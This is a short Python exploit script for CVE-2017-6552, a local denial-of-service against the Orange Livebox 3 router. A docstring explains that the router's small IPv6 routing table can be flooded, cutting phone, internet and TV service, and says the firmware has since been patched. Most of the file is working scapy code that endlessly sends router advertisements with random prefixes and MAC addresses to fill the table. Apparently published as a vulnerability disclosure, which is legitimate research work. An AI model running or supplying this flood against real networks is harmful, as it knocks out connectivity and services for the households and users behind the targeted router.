#!/usr/bin/python

# Exploit Title: CVE-2017-6552 - Local DoS Buffer Overflow Livebox 3
# Date: 09/03/2017
# Exploit Author: Quentin Olagne
# Vendor Homepage: http://www.orange.fr/
# Version: SG30_sip-fr-5.15.8.1
# Tested on: Livebox 3 - Sagemcom
# CVE : CVE-2017-6552

'''
Livebox router has its default IPv6 routing table max. size too
small and therefore can be filled within minutes. 
An attacker can exploit this issue to render the affected system 
unresponsive, resulting in a denial-of-service condition for Phone, 
Internet and TV services.

Vulenrability has been discovered in April '16 and has been patched some time ago with the newest firmware. 
I have submitted the idea to have a button to enable/disable IPv6 stack on the local interface from the admin 
livebox web UI, don't know if it's been implemented. 

'''

from scapy.all import *
import time
import threading

start_time = time.time()

def printit():
    threading.Timer(5.0, printit).start()
    interval = time.time() - start_time
    print 'Total time in seconds:', interval, '\n'

printit()

packet = Ether() \
    /IPv6() \
    /ICMPv6ND_RA() \
    /ICMPv6NDOptPrefixInfo(prefix=RandIP6(),prefixlen=64) \
    /ICMPv6NDOptSrcLLAddr(lladdr=RandMAC("00:01:42"))

try:
    sendp(packet,loop=1)
except KeyboardInterrupt:
        stored_exception=sys.exc_info()
except:
    pass

print "Goodbye"